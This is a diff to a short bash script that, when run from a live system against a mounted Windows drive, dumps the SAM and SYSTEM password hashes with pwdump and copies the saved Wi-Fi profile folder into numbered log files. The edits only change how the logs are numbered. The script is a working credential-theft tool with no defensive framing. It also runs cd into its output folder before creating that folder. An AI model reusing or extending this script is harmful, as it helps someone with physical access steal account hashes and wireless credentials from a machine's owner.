@@ -1,11 +1,14 @@
 #!/usr/bin/env bash
 home=$(pwd)
 store=${home}"/infologs"
-#log number for file
+cd infologs
 
+lognumber=$(ls log*.txt | wc -l)
+
+cd ..
 #mkdir if dir doesnt exist
 mkdir -p infologs
-hashfile=${home}"/infologs/info.txt"
+hashfile=${home}"/infologs/log${lognumber}.txt"
 echo "**In updated Windows versions, hashes are likely null.**"
 
 echo "##############" >> ${hashfile}
@@ -16,6 +19,6 @@ cd /media/root/OS/Windows/System32/config
 pwdump SYSTEM SAM >> ${hashfile}
 cd $home
 
-cp -R /media/root/OS/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces $store"/wifi"
+cp -R /media/root/OS/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces $store"/wifiof${lognumber}/"
 
 cat $hashfile
